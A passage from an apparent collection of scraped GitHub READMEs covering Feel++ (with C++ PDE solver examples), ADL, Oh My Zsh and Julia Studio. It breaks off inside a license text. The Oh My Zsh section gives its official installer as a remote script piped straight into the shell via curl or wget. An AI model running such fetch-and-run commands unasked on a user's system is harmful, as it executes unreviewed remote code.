https:\/\/www.gnu.org\/philosophy\/free-sw.html\n\n\ntoc::[]\n\nimage:https:\/\/github-basic-badges.herokuapp.com\/release\/feelpp\/feelpp.svg[link=https:\/\/github.com\/feelpp\/feelpp\/releases\/latest]\nimage:https:\/\/badge.buildkite.com\/192023cd78277ebeb80f48580ea813c586ec6dcd0365531b33.svg?branch=develop[\"Build Status\", link=\"https:\/\/buildkite.com\/feelpp\/feelpp\"]\nimage:https:\/\/api.codacy.com\/project\/badge\/Grade\/ee741577e2454024a18d44603be62a6d[link=\"https:\/\/www.codacy.com\/app\/prudhomm\/feelpp?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=feelpp\/feelpp&amp;utm_campaign=Badge_Grade\"]\n\nlink:http:\/\/www.feelpp.org[{feelpp}] is a {cpp} library for continuous or discontinuous Galerkin methods including finite element method(FEM), spectral element methods(SEM), reduced basis methods, discontinuous galerkin methods (DG and HDG) in 1D 2D and 3D and in parallel.\n\n== {feelpp} Documentation\n\n.link:http:\/\/book.feelpp.org[{feelpp} Book web site]\nimage::https:\/\/media.githubusercontent.com\/media\/feelpp\/book.feelpp.org\/master\/images\/cover_small.jpg[{feelpp} Book,link=http:\/\/book.feelpp.org]\n\n== Gitter Discussion Forum\n\nWe encourage you to ask questions and discuss any aspects of the project on the link:http:\/\/gitter.im\/feelpp\/feelpp[{feelpp}\n  Gitter forum].\nNew contributors are always welcome!\n\nimage:https:\/\/badges.gitter.im\/Join%20Chat.svg[\"Join the chat at\", https:\/\/gitter.im\/feelpp\/feelpp\",link=\"https:\/\/gitter.im\/feelpp\/feelpp\"]\n\n\n== Continuous Integration\n\n{feelpp} maintains various branches.\nAt the core, the development model is greatly inspired by existing models out there.\nThe central repo holds two main branches with an infinite lifetime: `master` and `develop`\n\n`master`::\nMain branch where the source code of HEAD always reflects a _production-ready_ state.\n\n`develop`::\nMain branch where the source code of HEAD always reflects a state with the latest delivered development changes for the next release.\nSome would call this the \u201cintegration branch\u201d. This is where any automatic nightly builds are built from.\n\n`feature\/*`::\nFeature branches (or sometimes called topic branches) are used to develop new features for the upcoming or a distant future release.\nWhen starting development of a feature, the target release in which this feature will be incorporated may well be unknown at that point.\nThe essence of a feature branch is that it exists as long as the feature is in development, but will eventually be merged back into develop (to definitely add the new feature to the upcoming release) or discarded (in case of a disappointing experiment).\n\n|===\n| Platform & Compiler | `master` | `develop`\n\n| Buildkite Ubuntu 16.04 clang6\n|  image:https:\/\/badge.buildkite.com\/192023cd78277ebeb80f48580ea813c586ec6dcd0365531b33.svg?branch=master[\"Build Status\", link=\"https:\/\/buildkite.com\/feelpp\/feelpp\"]\n| image:https:\/\/badge.buildkite.com\/192023cd78277ebeb80f48580ea813c586ec6dcd0365531b33.svg?branch=develop[\"Build Status\", link=\"https:\/\/buildkite.com\/feelpp\/feelpp\"]\n\n| Buildkite Ubuntu 16.04 clang5\n| image:https:\/\/badge.buildkite.com\/56a8f50b0cd6a7ebf60abb852eb5f78f578f36623b37701809.svg?branch=master[link=\"https:\/\/buildkite.com\/feelpp\/feelpp-clang5\"]\n| image:https:\/\/badge.buildkite.com\/56a8f50b0cd6a7ebf60abb852eb5f78f578f36623b37701809.svg?branch=develop[link=\"https:\/\/buildkite.com\/feelpp\/feelpp-clang5\"]\n\n| Buildkite Ubuntu 16.04 clang4\n| image:https:\/\/badge.buildkite.com\/70be862a4a14334363d173068c7b0c7caf63adc8e1555bd813.svg?branch=master[link=\"https:\/\/buildkite.com\/feelpp\/feelpp-clang4\"]\n| image:https:\/\/badge.buildkite.com\/70be862a4a14334363d173068c7b0c7caf63adc8e1555bd813.svg?branch=develop[link=\"https:\/\/buildkite.com\/feelpp\/feelpp-clang4\"]\n\n| Buildkite MacOsX Homebrew\n| image:https:\/\/badge.buildkite.com\/8957ffa3255c088997196cfe0743e43e3c4fca200d39755f4b.svg?branch=master[link=https:\/\/buildkite.com\/feelpp\/feelpp-homebrew]\n| image:https:\/\/badge.buildkite.com\/8957ffa3255c088997196cfe0743e43e3c4fca200d39755f4b.svg?branch=develop[link=https:\/\/buildkite.com\/feelpp\/feelpp-homebrew]\n\n|===\n\n== What is {feelpp}?\n\nlink:http:\/\/www.feelpp.org[{feelpp}] is a {cpp} library for continuous or discontinuous Galerkin methods including finite element method(FEM), spectral element methods(SEM), reduced basis methods, discontinuous galerkin methods (DG and HDG) in 1D 2D and 3D and in parallel.\nThe objectives of this framework is quite ambitious; ambitions which could be express in various ways such as :\n\n * the creation of a versatile mathematical kernel solving easily problems using different techniques thus allowing testing and comparing methods, e.g. cG versus dG,\n * the creation of a small and manageable library which shall nevertheless encompass a wide range of numerical methods and techniques,\n * build mathematical software that follows closely the mathematical abstractions associated with partial differential equations (PDE),\n * the creation of a library entirely in C++ allowing to create complex and typically multi-physics applications such as fluid-structure interaction or mass transport in haemodynamic.\n\n\nSome basic installation procedure are available in the link:INSTALL.md[INSTALL] file, the detailled process is available link:http:\/\/www.feelpp.org\/docs\/develop\/BuildingP.html[here].\n\n== Releases\n\nHere are the latest releases of {feelpp}\n\n* {feelpp} link:https:\/\/github.com\/feelpp\/feelpp\/releases\/tag\/v0.104.0-beta.2[v0.104.0-beta.2] image:https:\/\/zenodo.org\/badge\/DOI\/10.5281\/zenodo.1239039.svg[\"DOI\",link=\"https:\/\/doi.org\/10.5281\/zenodo.1239039\"]\n\n\n* {feelpp} link:https:\/\/github.com\/feelpp\/feelpp\/releases\/tag\/v0.104.0-beta.1[v0.104.0-beta.1] image:https:\/\/zenodo.org\/badge\/DOI\/10.5281\/zenodo.1227144.svg[\"DOI\",link=\"https:\/\/doi.org\/10.5281\/zenodo.1227144\"]\n\n * {feelpp} link:https:\/\/github.com\/feelpp\/feelpp\/releases\/tag\/v0.103.2[v0.103.2] image:https:\/\/zenodo.org\/badge\/DOI\/10.5281\/zenodo.581705.svg[\"DOI\",link=\"https:\/\/doi.org\/10.5281\/zenodo.581705\"]\n\n * {feelpp} link:https:\/\/github.com\/feelpp\/feelpp\/releases\/tag\/v0.102.0[v0.102.0]\n image:https:\/\/zenodo.org\/badge\/doi\/10.5281\/zenodo.495740.svg[\"DOI\",link=\"https:\/\/doi.org\/10.5281\/zenodo.495740\"]\n\n * {feelpp} link:https:\/\/github.com\/feelpp\/feelpp\/releases\/tag\/v0.100.0[v0.100.0]\n image:https:\/\/zenodo.org\/badge\/doi\/10.5281\/zenodo.45132.svg[\"DOI\",link=\"https:\/\/doi.org\/10.5281\/zenodo.45132\"]\n\n * {feelpp} link:https:\/\/github.com\/feelpp\/feelpp\/releases\/tag\/v0.99.0-final.1[v0.99.0] image:https:\/\/zenodo.org\/badge\/doi\/10.5281\/zenodo.11624.svg[\"DOI\",link=\"https:\/\/doi.org\/10.5281\/zenodo.11624\"]\n\n== Features\n\n * 1D 2D and 3D (including high order) geometries and also lower topological dimension 1D(curve) in 2D and 3D or 2D(surface) in 3D\n * continuous and discontinuous arbitrary order Galerkin Methods in 1D, 2D and 3D including finite and spectral element methods\n * domain specific embedded language in C++ for variational formulations\n * interfaced with link:http:\/\/www.mcs.anl.gov\/petsc\/[PETSc] for linear and non-linear solvers\n * seamless parallel computations using PETSc\n * interfaced with link:http:\/\/www.grycap.upv.es\/slepc\/[SLEPc] for large-scale sparse standard and generalized eigenvalue  solvers\n * supports link:http:\/\/www.geuz.org\/gmsh[Gmsh] for mesh generation\n * supports link:http:\/\/www.geuz.org\/gmsh[Gmsh] for post-processing (including on high order geometries)\n * supports link:http:\/\/www.paraview.org[Paraview] and CEI\/Ensight for post-processing and the following file formats: ensight gold, gmsh, xdmf.\n\n\n== Contributing\n\nIn the spirit of {uri-freesoftware}[free software], _everyone_ is encouraged to help improve this project.\nIf you discover errors or omissions in the source code, documentation, or website content, please don't hesitate to submit an issue or open a pull request with a fix.\n New contributors are always welcome!\n\nHere are some ways *you* can contribute:\n\n* by using develop versions\n* by {uri-issues}[reporting bugs]\n* by {uri-issues}[suggesting new features]\n * by writing or editing documentation\n * by writing specifications\n * by writing code -- _No patch is too small._\n ** fix typos\n ** add comments\n ** write examples!\n ** write tests!\n * by refactoring code\n * by fixing {uri-issues}[issues]\n * by reviewing Pull Requests\n\nThe {uri-contribute}[Contributing] guide provides information on how to create, style, and submit issues, feature requests, code, and documentation to the {feelpp} Project.\n\n== Getting Help\n\nThe {feelpp} project is developed to help you easily do _(i)_ modelisation simulation and optimisation and _(ii)_ high performance computing.\nBut we can't do it without your feedback!\nWe encourage you to ask questions and discuss any aspects of the project on the discussion list, on Twitter or in the chat room.\n\nTwitter:: #feelpp hashtag or @feelpp mention\nChat (Gitter):: image:https:\/\/badges.gitter.im\/Join%20In.svg[Gitter, link=https:\/\/gitter.im\/feelpp\/feelpp]\n\nifdef::env-github[]\nFurther information and documentation about {feelpp} can be found on the project's website.\n\n{uri-project}\/[Home] | {uri-news}[News] | {uri-docs}[Docs]\nendif::[]\n\nThe {feelpp} organization on GitHub hosts the project's source code, issue tracker, and sub-projects.\n\nSource repository (git):: {uri-repo}\nIssue tracker:: {uri-issues}\n{feelpp} organization on GitHub:: {uri-org}\n\n== Copyright and Licensing\n\nCopyright (C) 2011-2017 {feelpp} Consortium.\nFree use of this software is granted under the terms of the GPL License.\n\nSee the {uri-license}[LICENSE] file for details.\n\n== Authors\n\n{feelpp} is led by https:\/\/github.com\/prudhomm[Christophe Prud'homme] and has received contributions from {uri-contributors}[many other individuals].\nThe project was initiated in 2006 by https:\/\/github.com\/prudhomm[Christophe Prud'homme] and based initially on link:https:\/\/cmcsforge.epfl.ch\/projects\/lifev\/[lifeV] and completely re-written since then.\n\n== Examples\n\n=== Laplacian in 2D using P3 Lagrange basis functions\n\nHere is a full example to solve\n$$-\\Delta u = f \\mbox{ in } \\Omega,\\quad u=g \\mbox{ on } \\partial \\Omega$$\n\n[source,cpp]\n----\n#include <feel\/feel.hpp>\n\nint main(int argc, char**argv )\n{\n    using namespace Feel;\n    Environment env( _argc=argc, _argv=argv,\n                     _desc=feel_options(),\n                     _about=about(_name=\"qs_laplacian\",\n                                  _author=\"Feel++ Consortium\",\n                                  _email=\"feelpp-devel@feelpp.org\"));\n\n    auto mesh = unitSquare();\n    auto Vh = Pch<1>( mesh );\n    auto u = Vh->element();\n    auto v = Vh->element();\n\n    auto l = form1( _test=Vh );\n    l = integrate(_range=elements(mesh),\n                  _expr=id(v));\n\n    auto a = form2( _trial=Vh, _test=Vh );\n    a = integrate(_range=elements(mesh),\n                  _expr=gradt(u)*trans(grad(v)) );\n    a+=on(_range=boundaryfaces(mesh), _rhs=l, _element=u,\n          _expr=constant(0.) );\n    a.solve(_rhs=l,_solution=u);\n\n    auto e = exporter( _mesh=mesh, _name=\"qs_laplacian\" );\n    e->add( \"u\", u );\n    e->save();\n    return 0;\n}\n----\n\n\n=== Bratu equation in 2D\n\nHere is a full non-linear example - the Bratu equation - to solve\n$$-\\Delta u + e^u = 0 \\mbox{ in } \\Omega,\\quad u=0 \\mbox{ on } \\partial \\Omega$$.\n\n[source,cpp]\n----\n#include <feel\/feel.hpp>\n\ninline\nFeel::po::options_description\nmakeOptions()\n{\n    Feel::po::options_description bratuoptions( \"Bratu problem options\" );\n    bratuoptions.add_options()\n    ( \"lambda\", Feel::po::value<double>()->default_value( 1 ),\n                \"exp() coefficient value for the Bratu problem\" )\n    ( \"penalbc\", Feel::po::value<double>()->default_value( 30 ),\n                 \"penalisation parameter for the weak boundary conditions\" )\n    ( \"hsize\", Feel::po::value<double>()->default_value( 0.1 ),\n               \"first h value to start convergence\" )\n    ( \"export-matlab\", \"export matrix and vectors in matlab\" )\n    ;\n    return bratuoptions.add( Feel::feel_options() );\n}\n\n\/**\n * Bratu Problem\n *\n * solve \\f$ -\\Delta u + \\lambda \\exp(u) = 0, \\quad u_\\Gamma = 0\\f$ on \\f$\\Omega\\f$\n *\/\nint\nmain( int argc, char** argv )\n{\n\n    using namespace Feel;\n    Environment env( _argc=argc, _argv=argv,\n                     _desc=makeOptions(),\n                     _about=about(_name=\"bratu\",\n                                  _author=\"Christophe Prud'homme\",\n                                  _email=\"christophe.prudhomme@feelpp.org\"));\n    auto mesh = unitSquare();\n    auto Vh = Pch<3>( mesh );\n    auto u = Vh->element();\n    auto v = Vh->element();\n    double penalbc = option(_name=\"penalbc\").as<double>();\n    double lambda = option(_name=\"lambda\").as<double>();\n\n    auto Jacobian = [=](const vector_ptrtype& X, sparse_matrix_ptrtype& J)\n        {\n            auto a = form2( _test=Vh, _trial=Vh, _matrix=J );\n            a = integrate( elements( mesh ), gradt( u )*trans( grad( v ) ) );\n            a += integrate( elements( mesh ), lambda*( exp( idv( u ) ) )*idt( u )*id( v ) );\n            a += integrate( boundaryfaces( mesh ),\n               ( - trans( id( v ) )*( gradt( u )*N() ) - trans( idt( u ) )*( grad( v )*N()  + penalbc*trans( idt( u ) )*id( v )\/hFace() ) );\n        };\n    auto Residual = [=](const vector_ptrtype& X, vector_ptrtype& R)\n        {\n            auto u = Vh->element();\n            u = *X;\n            auto r = form1( _test=Vh, _vector=R );\n            r = integrate( elements( mesh ), gradv( u )*trans( grad( v ) ) );\n            r +=  integrate( elements( mesh ),  lambda*exp( idv( u ) )*id( v ) );\n            r +=  integrate( boundaryfaces( mesh ),\n               ( - trans( id( v ) )*( gradv( u )*N() ) - trans( idv( u ) )*( grad( v )*N() ) + penalbc*trans( idv( u ) )*id( v )\/hFace() ) );\n        };\n    u.zero();\n    backend()->nlSolver()->residual = Residual;\n    backend()->nlSolver()->jacobian = Jacobian;\n    backend()->nlSolve( _solution=u );\n\n    auto e = exporter( _mesh=mesh );\n    e->add( \"u\", u );\n    e->save();\n}\n----\n\n\n\n"},{"repo":"\/timbod7\/adl","language":"C++","readme_contents":"ADL (Algebraic Data Language)\n================================\n\n*Consistent data everywhere!*\n\nA framework for building cross language data models. It consists of a DSL for describing data types,\ncode generators for several target languages, and runtimes for these languages.\n\n* [introduction][] - an overview of the ADL system\n* [language][] - a description of the ADL language\n* [compiler][] - the command line compiler\n* [serialization][] - how ADL types are serialized\n* Language support:\n    * [haskell][]\n    * [java][]\n    * [typescript][]\n    * [c++][cpp]\n    * [rust][]\n* [install][] - installation instructions\n\n[introduction]:docs\/introduction.md\n[language]:docs\/language.md\n[compiler]:docs\/compiler.md\n[serialization]:docs\/serialization.md\n[install]:docs\/install.md\n[haskell]:docs\/backend-haskell.md\n[typescript]:docs\/backend-typescript.md\n[java]:docs\/backend-java.md\n[cpp]:docs\/backend-cpp.md\n[rust]:docs\/backend-rust.md\n"},{"repo":"\/ohmyzsh\/ohmyzsh","language":"Shell","readme_contents":"<p align=\"center\">\n  <img src=\"https:\/\/s3.amazonaws.com\/ohmyzsh\/oh-my-zsh-logo.png\" alt=\"Oh My Zsh\">\n<\/p>\n\n[![Discord server](https:\/\/img.shields.io\/discord\/642496866407284746)](https:\/\/discord.gg\/bpXWhnN)\n[![Follow @ohmyzsh](https:\/\/img.shields.io\/twitter\/follow\/ohmyzsh?label=Follow+@ohmyzsh&style=flat)](https:\/\/twitter.com\/intent\/follow?screen_name=ohmyzsh)\n\nOh My Zsh is an open source, community-driven framework for managing your [zsh](https:\/\/www.zsh.org\/) configuration.\n\nSounds boring. Let's try again.\n\n__Oh My Zsh will not make you a 10x developer...but you may feel like one.__\n\nOnce installed, your terminal shell will become the talk of the town _or your money back!_ With each keystroke in your command prompt, you'll take advantage of the hundreds of powerful plugins and beautiful themes. Strangers will come up to you in caf\u00e9s and ask you, _\"that is amazing! are you some sort of genius?\"_\n\nFinally, you'll begin to get the sort of attention that you have always felt you deserved. ...or maybe you'll use the time that you're saving to start flossing more often. \ud83d\ude2c\n\nTo learn more, visit [ohmyz.sh](https:\/\/ohmyz.sh) and follow [@ohmyzsh](https:\/\/twitter.com\/ohmyzsh) on Twitter.\n\n## Getting Started\n\n### Prerequisites\n\n* A Unix-like operating system: macOS, Linux, BSD. On Windows: WSL is preferred, but cygwin or msys also mostly work.\n* [Zsh](https:\/\/www.zsh.org) should be installed (v4.3.9 or more recent). If not pre-installed (run `zsh --version` to confirm), check the following instructions here: [Installing ZSH](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/Installing-ZSH)\n* `curl` or `wget` should be installed\n* `git` should be installed\n\n### Basic Installation\n\nOh My Zsh is installed by running one of the following commands in your terminal. You can install this via the command-line with either `curl` or `wget`.\n\n#### via curl\n\n```shell\nsh -c \"$(curl -fsSL https:\/\/raw.githubusercontent.com\/ohmyzsh\/ohmyzsh\/master\/tools\/install.sh)\"\n```\n\n#### via wget\n\n```shell\nsh -c \"$(wget -O- https:\/\/raw.githubusercontent.com\/ohmyzsh\/ohmyzsh\/master\/tools\/install.sh)\"\n```\n\n#### Manual inspection\n\nIt's a good idea to inspect the install script from projects you don't yet know. You can do\nthat by downloading the install script first, looking through it so everything looks normal,\nthen running it:\n\n```shell\ncurl -Lo install.sh https:\/\/raw.githubusercontent.com\/ohmyzsh\/ohmyzsh\/master\/tools\/install.sh\nsh install.sh\n```\n\n## Using Oh My Zsh\n\n### Plugins\n\nOh My Zsh comes with a shitload of plugins to take advantage of. You can take a look in the [plugins](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/tree\/master\/plugins) directory and\/or the [wiki](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/Plugins) to see what's currently available.\n\n#### Enabling Plugins\n\nOnce you spot a plugin (or several) that you'd like to use with Oh My Zsh, you'll need to enable them in the `.zshrc` file. You'll find the zshrc file in your `$HOME` directory. Open it with your favorite text editor and you'll see a spot to list all the plugins you want to load.\n\n```shell\nvi ~\/.zshrc\n```\n\nFor example, this might begin to look like this:\n\n```shell\nplugins=(\n  git\n  bundler\n  dotenv\n  osx\n  rake\n  rbenv\n  ruby\n)\n```\n\n_Note that the plugins are separated by whitespace. **Do not** use commas between them._\n\n#### Using Plugins\n\nMost plugins (should! we're working on this) include a __README__, which documents how to use them.\n\n### Themes\n\nWe'll admit it. Early in the Oh My Zsh world, we may have gotten a bit too theme happy. We have over one hundred themes now bundled. Most of them have [screenshots](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/Themes) on the wiki. Check them out!\n\n#### Selecting a Theme\n\n_Robby's theme is the default one. It's not the fanciest one. It's not the simplest one. It's just the right one (for him)._\n\nOnce you find a theme that you'd like to use, you will need to edit the `~\/.zshrc` file. You'll see an environment variable (all caps) in there that looks like:\n\n```shell\nZSH_THEME=\"robbyrussell\"\n```\n\nTo use a different theme, simply change the value to match the name of your desired theme. For example:\n\n```shell\nZSH_THEME=\"agnoster\" # (this is one of the fancy ones)\n# see https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/Themes#agnoster\n```\n\n_Note: many themes require installing the [Powerline Fonts](https:\/\/github.com\/powerline\/fonts) in order to render properly._\n\nOpen up a new terminal window and your prompt should look something like this:\n\n![Agnoster theme](https:\/\/cloud.githubusercontent.com\/assets\/2618447\/6316862\/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png)\n\nIn case you did not find a suitable theme for your needs, please have a look at the wiki for [more of them](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/External-themes).\n\nIf you're feeling feisty, you can let the computer select one randomly for you each time you open a new terminal window.\n\n\n```shell\nZSH_THEME=\"random\" # (...please let it be pie... please be some pie..)\n```\n\nAnd if you want to pick random theme from a list of your favorite themes:\n\n```shell\nZSH_THEME_RANDOM_CANDIDATES=(\n  \"robbyrussell\"\n  \"agnoster\"\n)\n```\n\n### FAQ\n\nIf you have some more questions or issues, you might find a solution in our [FAQ](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/FAQ).\n\n## Advanced Topics\n\nIf you're the type that likes to get their hands dirty, these sections might resonate.\n\n### Advanced Installation\n\nSome users may want to manually install Oh My Zsh, or change the default path or other settings that\nthe installer accepts (these settings are also documented at the top of the install script).\n\n#### Custom Directory\n\nThe default location is `~\/.oh-my-zsh` (hidden in your home directory)\n\nIf you'd like to change the install directory with the `ZSH` environment variable, either by running\n`export ZSH=\/your\/path` before installing, or by setting it before the end of the install pipeline\nlike this:\n\n```shell\nZSH=\"$HOME\/.dotfiles\/oh-my-zsh\" sh install.sh\n```\n\n#### Unattended install\n\nIf you're running the Oh My Zsh install script as part of an automated install, you can pass the\nflag `--unattended` to the `install.sh` script. This will have the effect of not trying to change\nthe default shell, and also won't run `zsh` when the installation has finished.\n\n```shell\nsh -c \"$(curl -fsSL https:\/\/raw.githubusercontent.com\/ohmyzsh\/ohmyzsh\/master\/tools\/install.sh)\" \"\" --unattended\n```\n\n#### Installing from a forked repository\n\nThe install script also accepts these variables to allow installation of a different repository:\n\n- `REPO` (default: `ohmyzsh\/ohmyzsh`): this takes the form of `owner\/repository`. If you set\n  this variable, the installer will look for a repository at `https:\/\/github.com\/{owner}\/{repository}`.\n\n- `REMOTE` (default: `https:\/\/github.com\/${REPO}.git`): this is the full URL of the git repository\n  clone. You can use this setting if you want to install from a fork that is not on GitHub (GitLab,\n  Bitbucket...) or if you want to clone with SSH instead of HTTPS (`git@github.com:user\/project.git`).\n\n  _NOTE: it's incompatible with setting the `REPO` variable. This setting will take precedence._\n\n- `BRANCH` (default: `master`): you can use this setting if you want to change the default branch to be\n  checked out when cloning the repository. This might be useful for testing a Pull Request, or if you\n  want to use a branch other than `master`.\n\nFor example:\n\n```shell\nREPO=apjanke\/oh-my-zsh BRANCH=edge sh install.sh\n```\n\n#### Manual Installation\n\n##### 1. Clone the repository:\n\n```shell\ngit clone https:\/\/github.com\/ohmyzsh\/ohmyzsh.git ~\/.oh-my-zsh\n```\n\n##### 2. *Optionally*, backup your existing `~\/.zshrc` file:\n\n```shell\ncp ~\/.zshrc ~\/.zshrc.orig\n```\n\n##### 3. Create a new zsh configuration file\n\nYou can create a new zsh config file by copying the template that we have included for you.\n\n```shell\ncp ~\/.oh-my-zsh\/templates\/zshrc.zsh-template ~\/.zshrc\n```\n\n##### 4. Change your default shell\n\n```shell\nchsh -s $(which zsh)\n```\n\nYou must log out from your user session and log back in to see this change.\n\n##### 5. Initialize your new zsh configuration\n\nOnce you open up a new terminal window, it should load zsh with Oh My Zsh's configuration.\n\n### Installation Problems\n\nIf you have any hiccups installing, here are a few common fixes.\n\n* You _might_ need to modify your `PATH` in `~\/.zshrc` if you're not able to find some commands after\nswitching to `oh-my-zsh`.\n* If you installed manually or changed the install location, check the `ZSH` environment variable in\n`~\/.zshrc`.\n\n### Custom Plugins and Themes\n\nIf you want to override any of the default behaviors, just add a new file (ending in `.zsh`) in the `custom\/` directory.\n\nIf you have many functions that go well together, you can put them as a `XYZ.plugin.zsh` file in the `custom\/plugins\/` directory and then enable this plugin.\n\nIf you would like to override the functionality of a plugin distributed with Oh My Zsh, create a plugin of the same name in the `custom\/plugins\/` directory and it will be loaded instead of the one in `plugins\/`.\n\n## Getting Updates\n\nBy default, you will be prompted to check for upgrades every few weeks. If you would like `oh-my-zsh` to automatically upgrade itself without prompting you, set the following in your `~\/.zshrc`:\n\n```shell\nDISABLE_UPDATE_PROMPT=true\n```\n\nTo disable automatic upgrades, set the following in your `~\/.zshrc`:\n\n```shell\nDISABLE_AUTO_UPDATE=true\n```\n\n### Manual Updates\n\nIf you'd like to upgrade at any point in time (maybe someone just released a new plugin and you don't want to wait a week?) you just need to run:\n\n```shell\nupgrade_oh_my_zsh\n```\n\nMagic! \ud83c\udf89\n\n## Uninstalling Oh My Zsh\n\nOh My Zsh isn't for everyone. We'll miss you, but we want to make this an easy breakup.\n\nIf you want to uninstall `oh-my-zsh`, just run `uninstall_oh_my_zsh` from the command-line. It will remove itself and revert your previous `bash` or `zsh` configuration.\n\n## How do I contribute to Oh My Zsh?\n\nBefore you participate in our delightful community, please read the [code of conduct](CODE_OF_CONDUCT.md).\n\nI'm far from being a [Zsh](https:\/\/www.zsh.org\/) expert and suspect there are many ways to improve \u2013 if you have ideas on how to make the configuration easier to maintain (and faster), don't hesitate to fork and send pull requests!\n\nWe also need people to test out pull-requests. So take a look through [the open issues](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/issues) and help where you can.\n\nSee [Contributing](CONTRIBUTING.md) for more details.\n\n### Do NOT send us themes\n\nWe have (more than) enough themes for the time being. Please add your theme to the [external themes](https:\/\/github.com\/ohmyzsh\/ohmyzsh\/wiki\/External-themes) wiki page.\n\n## Contributors\n\nOh My Zsh has a vibrant community of happy users and delightful contributors. Without all the time and help from our contributors, it wouldn't be so awesome.\n\nThank you so much!\n\n## Follow Us\n\nWe're on the social media.\n\n* [@ohmyzsh](https:\/\/twitter.com\/ohmyzsh) on Twitter. You should follow it.\n* [Oh My Zsh](https:\/\/www.facebook.com\/Oh-My-Zsh-296616263819290\/) on Facebook.\n\n## Merchandise\n\nWe have [stickers, shirts, and coffee mugs available](https:\/\/shop.planetargon.com\/collections\/oh-my-zsh?utm_source=github) for you to show off your love of Oh My Zsh. Again, you will become the talk of the town!\n\n## License\n\nOh My Zsh is released under the [MIT license](LICENSE.txt).\n\n## About Planet Argon\n\n![Planet Argon](https:\/\/pa-github-assets.s3.amazonaws.com\/PARGON_logo_digital_COL-small.jpg)\n\nOh My Zsh was started by the team at [Planet Argon](https:\/\/www.planetargon.com\/?utm_source=github), a [Ruby on Rails development agency](https:\/\/www.planetargon.com\/skills\/ruby-on-rails-development?utm_source=github). Check out our [other open source projects](https:\/\/www.planetargon.com\/open-source?utm_source=github).\n"},{"repo":"\/forio\/julia-studio","language":"C++","readme_contents":"<a name=\"logo\"\/>\n<div align=\"center\">\n<a href=\"http:\/\/forio.com\/products\/julia-studio\/\" target=\"_blank\">\n<img src=\"https:\/\/github.com\/forio\/julia-studio\/blob\/master\/src\/plugins\/juliaeditor\/images\/js-by-forio.png?raw=true\" alt=\"Julia Logo\" width=\"525\" height=\"128\"><\/img>\n<\/a>\n<\/div>\n\n## Julia Studio\n[Julia Studio](http:\/\/forio.com\/products\/julia-studio\/) is a cross-platform IDE for the [Julia language](http:\/\/julialang.org\/)\nbased on [Qt Creator](http:\/\/qt.gitorious.org\/qt-creator) and the [Qt framework](http:\/\/qt.gitorious.org\/qt).\n\n## Supported Platforms\n[Binary packages](http:\/\/forio.com\/products\/julia-studio\/download) are available for the following platforms:\n\n   * Mac OSX 10.6 and later\n   * Windows XP SP2 and later\n   * (K)Ubuntu Linux 12.04 and later\n\nJulia Studio binaries for Windows and Mac install the Julia programming language.  Linux users will need to [install Julia](http:\/\/julialang.org\/downloads\/) separately.\n\n![Screenshot of JuliaStudio running on Mac](http:\/\/forio.com\/img\/julia-studio\/js-plot.png)\n\n## Compiling Julia Studio\n\n#### Prerequisites\n\n   * [Qt 5.1.0 or later](http:\/\/qt-project.org\/downloads)\n   * [Julia 0.2 or later](http:\/\/julialang.org\/downloads\/)\n\n#### OSX\n```\ncd $SOURCE_DIRECTORY\nqmake -r\nmake\n```\nNote: Installation (\"make install\") is not needed. It is however possible, using\n```\nmake install INSTALL_ROOT=$INSTALL_DIRECTORY\n```\n\n#### Windows\nSee instructions in [windows-build.md](.\/windows-build.md)\n\n#### Linux\nSee instructions in [linux-build.md](.\/linux-build.md)\n\n\n## Third-party Components\nJulia Studio includes the following third-party components,\nwe thank the authors who made this possible:\n\n##### Open Source front-end for C++ (license MIT), enhanced for use in Qt Creator\n\n```\n  Roberto Raggi <roberto.raggi@gmail.com>\n\n  JuliaStudio\/src\/shared\/cplusplus\n\n  Copyright 2005 Roberto Raggi <roberto@kdevelop.org>\n\n  Permission to use, copy, modify, distribute, and sell this software and its\n  documentation for any purpose is hereby granted without fee, provided that\n  the above copyright notice appear in all copies and that both that\n  copyright notice and this permission notice appear in supporting\n  documentation.\n\n  The above copyright notice and this permission notice shall be included in\n  all copies or substantial portions of the Software.\n\n  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE\n  KDEVELOP TEAM BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN\n  AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\n  CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n```\n\n##### Botan, a C++ crypto library. Version 1.8.8\n\n```\n  Copyright (C) 1999-2004 The Botan Project. All rights reserved.\n  Copyright (C) 1999-2009 Jack Lloyd\n  2001 Peter J Jones\n  2004-2007 Justin Karneges\n  2005 Matthew Gregan\n  2005-2006 Matt Johnston\n  2006 Luca Piccarreta\n  2007 Yves Jerschow\n  2007-2008 FlexSecure GmbH\n  2007-2008 Technische Universitat Darmstadt\n  2007-2008 Falko Strenzke\n  2007-2008 Martin Doering\n  2007 Manuel Hartl\n  2007 Christoph Ludwig\n  2007 Patrick Sona\n  All rights reserved.\n\n  Redistribution and use in source and binary forms, with or without\n  modification, are permitted provided that the following conditions are met:\n\n  1. Redistributions of source code must retain the above copyright notice,\n  this list of conditions, and the following disclaimer.\n\n  2. Redistributions in binary form must reproduce the above copyright notice,\n  this list of conditions, and the following disclaimer in the documentation\n  and\/or other materials provided with the distribution.\n\n  THIS SOFTWARE IS PROVIDED BY THE AUTHOR(S) \"AS IS\" AND ANY EXPRESS OR IMPLIED\n  WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n  MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE, ARE DISCLAIMED. IN NO\n  EVENT SHALL THE AUTHOR(S) OR CONTRIBUTOR(S) BE LIABLE FOR ANY 